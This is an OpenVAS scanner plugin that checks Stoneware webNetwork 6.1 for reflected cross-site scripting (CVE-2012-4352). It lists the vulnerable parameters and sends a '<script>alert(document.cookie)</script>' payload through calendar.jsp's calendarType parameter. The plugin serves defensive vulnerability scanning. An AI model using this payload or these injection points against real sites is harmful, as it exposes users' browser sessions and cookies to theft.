###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_stoneware_webnetwork_mult_xss_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Stoneware webNetwork Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803326");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2012-4352");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-03-06 11:46:39 +0530 (Wed, 06 Mar 2013)");
  script_name("Stoneware webNetwork Multiple Cross-Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://stoneware-docs.s3.amazonaws.com/Bulletins/Security%20Bulletin%206_1_0.pdf");
  script_xref(name:"URL", value:"http://infosec42.blogspot.in/2012/10/stoneware-webnetwork-61-reflective-xss.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML or
  web script in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"Stoneware WebNetwork 6.1 before SP1");
  script_tag(name:"insight", value:"Multiple flaws exists because application does the validate,

  - 'blogName' parameter passed to blog.jsp and blogSearch.jsp

  - 'calendarType' and 'monthNumber' parameters passed to calendar.jsp

  - 'flag' parameter passed to swDashboard/ajax/setAppFlag.jsp");
  script_tag(name:"solution", value:"Upgrade to Stoneware webNetwork 6.1 SP1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"This host is installed with Stoneware webNetwork and is prone to
  multiple cross-site scripting vulnerabilities.");
  script_xref(name:"URL", value:"http://www.stone-ware.com/webnetwork");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

res = http_get_cache(item:"/",  port:port);

if('>Stoneware' >< res)
{
  url = '/community/calendar.jsp?calendarType=>'+
        '<script>alert(document.cookie)</script>';

  if(http_vuln_check(port: port, url: url, check_header: TRUE,
     pattern: "<script>alert\(document\.cookie\)</script>",
     extra_check: "Stoneware"))
  {
    security_message(port);
    exit(0);
  }
}
